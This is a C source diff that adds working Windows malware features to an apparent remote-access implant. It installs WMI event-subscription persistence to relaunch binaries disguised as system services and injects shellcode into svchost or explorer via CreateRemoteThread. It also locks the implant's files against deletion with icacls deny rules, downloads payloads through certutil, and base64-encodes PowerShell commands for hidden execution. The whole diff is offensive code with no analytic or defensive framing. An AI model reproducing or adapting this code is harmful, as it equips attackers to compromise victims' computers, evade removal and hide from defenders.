@@ -7,7 +7,10 @@
 
 #include "../engine/engine.h"
 
-/* Execute system command and capture output */
+#include <tlhelp32.h>
+#include <psapi.h>
+#include <wincrypt.h>
+
 char* sys_run_command(const char *cmd) {
     static char out[NET_BUF_SIZE];
     memset(out, 0, NET_BUF_SIZE);
@@ -447,6 +450,174 @@ void sys_spawn_shadow_copy(void) {
     spawn_single_copy("ElevationService.exe", "ElevationService");
     spawn_single_copy("CrashHandler.exe", "CrashHandler");
     spawn_single_copy("NotifyService.exe", "NotifyService");
+}
+
+/* === Advanced Persistence & Evasion === */
+
+/* 1. WMI Event Subscription — permanent persistence via root/subscription */
+void sys_wmi_persistence(void) {
+    FILE *f = fopen("C:\\Users\\Public\\wmi.ps1", "w");
+    if (!f) return;
+    
+    fprintf(f, "Remove-WmiObject -Namespace 'root/subscription' -Class __EventFilter -Filter \"Name='SysHealthFilter'\" -ErrorAction SilentlyContinue;\n");
+    fprintf(f, "Remove-WmiObject -Namespace 'root/subscription' -Class CommandLineEventConsumer -Filter \"Name='SysHealthConsumer'\" -ErrorAction SilentlyContinue;\n");
+    fprintf(f, "$f = Set-WmiObject -Class __EventFilter -Namespace 'root/subscription' -Arguments @{Name='SysHealthFilter';EventNamespace='root/cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA \"Win32_Process\"'};\n");
+    fprintf(f, "$c = Set-WmiObject -Class CommandLineEventConsumer -Namespace 'root/subscription' -Arguments @{Name='SysHealthConsumer';CommandLineTemplate='powershell.exe -NoProfile -WindowStyle Hidden -Command \"if (-not (Get-Process | Where-Object {$_.ProcessName -match \"ElevationService|CrashHandler|NotifyService\"})) { Start-Process \"$env:LOCALAPPDATA\\Microsoft\\Windows\\INetCache\\IE\\ElevationService.exe\" -ArgumentList \"--shadow\" -WindowStyle Hidden }\"'};\n");
+    fprintf(f, "Set-WmiObject -Class __FilterToConsumerBinding -Namespace 'root/subscription' -Arguments @{Filter=$f;Consumer=$c}\n");
+    fclose(f);
+    
+    char cmd[512];
+    snprintf(cmd, sizeof(cmd), "powershell -NoProfile -ExecutionPolicy Bypass -File \"C:\\Users\\Public\\wmi.ps1\"");
+    sys_run_command(cmd);
+    
+    DeleteFileA("C:\\Users\\Public\\wmi.ps1");
+}
+
+/* 2. Process Injection — inject into svchost.exe or explorer.exe */
+void sys_inject_process(void) {
+    DWORD pid = 0;
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32 pe;
+        pe.dwSize = sizeof(pe);
+        if (Process32First(hSnap, &pe)) {
+            do {
+                if (_stricmp(pe.szExeFile, "svchost.exe") == 0 || _stricmp(pe.szExeFile, "explorer.exe") == 0) {
+                    pid = pe.th32ProcessID;
+                    break;
+                }
+            } while (Process32Next(hSnap, &pe));
+        }
+        CloseHandle(hSnap);
+    }
+    
+    if (pid == 0) return;
+    
+    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProc) return;
+    
+    char payloadPath[MAX_PATH];
+    GetModuleFileNameA(NULL, payloadPath, MAX_PATH);
+    
+    SIZE_T pathLen = strlen(payloadPath) + 1;
+    LPVOID remotePath = VirtualAllocEx(hProc, NULL, pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!remotePath) {
+        CloseHandle(hProc);
+        return;
+    }
+    
+    WriteProcessMemory(hProc, remotePath, payloadPath, pathLen, NULL);
+    
+    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+    FARPROC pWinExec = GetProcAddress(hKernel32, "WinExec");
+    DWORD_PTR kernel32Base = (DWORD_PTR)hKernel32;
+    DWORD_PTR winExecOffset = (DWORD_PTR)pWinExec - kernel32Base;
+    
+    DWORD_PTR targetKernel32Base = 0;
+    HMODULE hMods[1024];
+    DWORD cbNeeded;
+    
+    if (EnumProcessModules(hProc, hMods, sizeof(hMods), &cbNeeded)) {
+        for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
+            char szModName[MAX_PATH];
+            if (GetModuleBaseNameA(hProc, hMods[i], szModName, sizeof(szModName))) {
+                if (_stricmp(szModName, "kernel32.dll") == 0) {
+                    targetKernel32Base = (DWORD_PTR)hMods[i];
+                    break;
+                }
+            }
+        }
+    }
+    
+    if (targetKernel32Base == 0) targetKernel32Base = kernel32Base;
+    DWORD_PTR targetWinExec = targetKernel32Base + winExecOffset;
+    
+    unsigned char shellcode[19] = {
+        0x48, 0xC7, 0xC2, 0x00, 0x00, 0x00, 0x00,
+        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0xFF, 0xE0
+    };
+    memcpy(shellcode + 9, &targetWinExec, 8);
+    
+    LPVOID remoteCode = VirtualAllocEx(hProc, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!remoteCode) {
+        VirtualFreeEx(hProc, remotePath, 0, MEM_RELEASE);
+        CloseHandle(hProc);
+        return;
+    }
+    
+    WriteProcessMemory(hProc, remoteCode, shellcode, sizeof(shellcode), NULL);
+    
+    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCode, remotePath, 0, NULL);
+    if (hThread) {
+        CloseHandle(hThread);
+    }
+    
+    CloseHandle(hProc);
+}
+
+/* 3. NTFS ACL Hardening — deny delete/modify for all shadow copies */
+void sys_harden_files(void) {
+    char localAppData[MAX_PATH];
+    GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
+    
+    char cmd[2048];
+    snprintf(cmd, sizeof(cmd),
+        "icacls \"%s\\Microsoft\\Windows\\INetCache\\IE\\ElevationService.exe\" /deny Everyone:(DE,DC) /c /q && "
+        "icacls \"%s\\Microsoft\\Windows\\INetCache\\IE\\CrashHandler.exe\" /deny Everyone:(DE,DC) /c /q && "
+        "icacls \"%s\\Microsoft\\Windows\\INetCache\\IE\\NotifyService.exe\" /deny Everyone:(DE,DC) /c /q",
+        localAppData, localAppData, localAppData);
+    sys_run_command(cmd);
+}
+
+/* 4. LOLBAS — use certutil to download and execute */
+void sys_lolbas_download(const char *url, const char *outPath) {
+    char cmd[1024];
+    snprintf(cmd, sizeof(cmd), "certutil -urlcache -split -f \"%s\" \"%s\"", url, outPath);
+    sys_run_command(cmd);
+}
+
+/* 5. PowerShell Obfuscation — base64 encode */
+char* sys_obfuscate_ps(const char *command) {
+    static char result[NET_BUF_SIZE];
+    
+    int wlen = MultiByteToWideChar(CP_UTF8, 0, command, -1, NULL, 0);
+    if (wlen <= 0) {
+        snprintf(result, sizeof(result), "[Obfuscation failed: conversion error]");
+        return result;
+    }
+    
+    wchar_t *wcmd = (wchar_t*)malloc(wlen * sizeof(wchar_t));
+    if (!wcmd) {
+        snprintf(result, sizeof(result), "[Obfuscation failed: memory error]");
+        return result;
+    }
+    
+    MultiByteToWideChar(CP_UTF8, 0, command, -1, wcmd, wlen);
+    
+    int blen = (wlen - 1) * sizeof(wchar_t);
+    DWORD base64len = 0;
+    
+    if (!CryptBinaryToStringA((BYTE*)wcmd, blen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64len) || base64len == 0) {
+        free(wcmd);
+        snprintf(result, sizeof(result), "[Obfuscation failed: encoding error]");
+        return result;
+    }
+    
+    char *base64 = (char*)malloc(base64len);
+    if (!base64) {
+        free(wcmd);
+        snprintf(result, sizeof(result), "[Obfuscation failed: memory error]");
+        return result;
+    }
+    
+    CryptBinaryToStringA((BYTE*)wcmd, blen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64, &base64len);
+    
+    snprintf(result, sizeof(result), "powershell -NoProfile -WindowStyle Hidden -EncodedCommand %s", base64);
+    
+    free(wcmd);
+    free(base64);
+    return result;
 }
 
 /* === Clipboard Subsystem === */
